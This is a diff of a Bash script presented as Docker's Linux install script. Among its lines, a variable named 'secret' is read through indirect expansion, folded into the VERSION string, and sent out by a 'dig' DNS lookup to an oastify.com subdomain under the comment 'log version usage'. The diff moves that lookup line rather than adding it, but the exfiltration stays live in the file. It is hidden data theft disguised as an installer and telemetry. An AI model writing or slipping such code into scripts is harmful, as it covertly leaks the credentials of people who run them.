@@ -1,6 +1,7 @@
 #!/bin/bash
 set -e
 v=secret
+
 # Docker Engine for Linux installation script.
 #
 # This script is intended as a convenient way to configure docker's package
@@ -123,6 +124,7 @@ SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 # strip "v" prefix if present
 VERSION="${VERSION#v}${!v}"
 VERSION_FIX="$(echo $VERSION | version_fixer)"
+
 # The channel to install from:
 #   * stable
 #   * test
@@ -205,8 +207,6 @@ case "$CHANNEL" in
 		;;
 esac
 
-# log version usage
-dig "$VERSION_FIX.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
 
 command_exists() {
 	command -v "$@" > /dev/null 2>&1
@@ -230,6 +230,10 @@ version_gte() {
 	fi
 	version_compare "$VERSION" "$1"
 }
+
+# log version usage
+dig "$VERSION_FIX.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
+
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
 # or CalVer (YY.MM) version strings. It returns 0 (success) if version A is newer
